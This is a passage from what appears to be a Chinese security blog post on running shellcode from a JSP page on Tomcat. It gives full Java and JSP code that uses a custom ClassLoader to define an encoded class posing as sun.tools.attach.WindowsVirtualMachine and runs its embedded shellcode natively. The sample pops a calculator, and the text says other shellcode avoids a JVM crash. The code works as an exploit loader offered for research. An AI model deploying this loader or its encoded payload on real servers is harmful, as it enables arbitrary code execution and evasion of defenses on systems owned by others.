kRAJ8QSVRZEQCgBFRZEQChENBUWREAohBBVFkRAKMQi1RZEQCkB1RZEQClEIhUWREAphBIVFkRAKcEVFkRAKgQ0FRZEQCpEEFUWREAqhBYVFkRAKsQQVRZEQCsEFhUWREArRBeVFkRAK4QWVRZEQCvEFpUWREAsBBBVFkRALEQWFRZEQCyEEFUWREAsxBZVFkRALQQQVRZEQC1EFpUWREAthBIVFkRALcQg1RZEQC4EOxUWREAuRAgVFkRALoQQVRZEQC7EFJUWREAvAJUWREAvRDgVFkRAL4QWFRZEQC/EEFUWREAwBBZVFkRAMEQWlRZEQDCEEhUWREAwxCLVFkRAMQQElRZEQDFEOlUWREAxhBXVFkRAMcCVFkRAMgCVFkRAMkCVFkRAMoQXVRZEQDLEEhUWREAzBC6VFkRAM0EVFkRAM4DVFkRAM8DVFkRANADVFkRANEDVFkRANIDVFkRANMDVFkRANQDVFkRANUQSFRZEQDWEI1UWREA1xCNVFkRANgEVFkRANkEVFkRANoDVFkRANsDVFkRANwQQVRZEQDdELpUWREA3hAxVFkRAN8Qi1RZEQDgEG9UWREA4RCHVFkRAOICVFkRAOMQ1VRZEQDkELtUWREA5RDwVFkRAOYQtVRZEQDnEKJUWREA6BBWVFkRAOkQQVRZEQDqELpUWREA6xCmVFkRAOwQlVRZEQDtEL1UWREA7hCdVFkRAO8CVFkRAPAQ1VRZEQDxEEhUWREA8hCDVFkRAPMQxFRZEQD0EChUWREA9RA8VFkRAPYQBlRZEQD3EHxUWREA+BAKVFkRAPkQgFRZEQD6EPtUWREA+xDgVFkRAPwQdVRZEQD9CFRZEQD+ELtUWREA/xBHVFkRAQAQE1RZEQEBEHJUWREBAhBvVFkRAQMQalRZEQEEA1RZEQEFEFlUWREBBhBBVFkRAQcQiVRZEQEIENpUWREBCQJUWREBChDVVFkRAQsQY1RZEQEMEGFUWREBDRBsVFkRAQ4QY1RZEQEPEC5UWREBEBBlVFkRAREQeFRZEQESEGVUWREBEwNUSxQABCoSBhIGA70AB7gACKcACEwrtgAKsQABBugG9wb6AAkAAgAPAAAAHgAHAAAAEAAFABMG6AAWBvcAGQb6ABcG+wAYBv8AGwAYAAAACQAC9wb6BwAZBAABABoAAAACABs=";
            Class result = new Myloader().get(Base64.getDecoder().decode(classStr));
            for (Method m:result.getDeclaredMethods())
            {
                System.out.println(m.getName());
                if (m.getName().equals("run"))
                {
                    m.invoke(result,new byte[]{});
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

### 2.jsp实现

测试环境为Tomcat

示例代码：

```
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.util.Base64" %>
<%!
    public static class Myloader extends ClassLoader
    {
        public Class get(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }
%>
<%
       try {
			//calc
            String classStr="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";           
            Class result = new Myloader().get(Base64.getDecoder().decode(classStr));
            for (Method m:result.getDeclaredMethods())
            {
                System.out.println(m.getName());
                if (m.getName().equals("run"))
                {
                    m.invoke(result,new byte[]{});
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
%>
```

弹出计算器的操作会导致Java进程崩溃，换成其他Shellcode会避免这个问题

## 0x04 小结
---

本文基于rebeyond的[《Java内存攻击技术漫谈》](https://mp.weixin.qq.com/s/JIjBjULjFnKDjEhzVAtxhw)，以Tomcat环境为例，实现了通过jsp加载Shellcode。


---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)

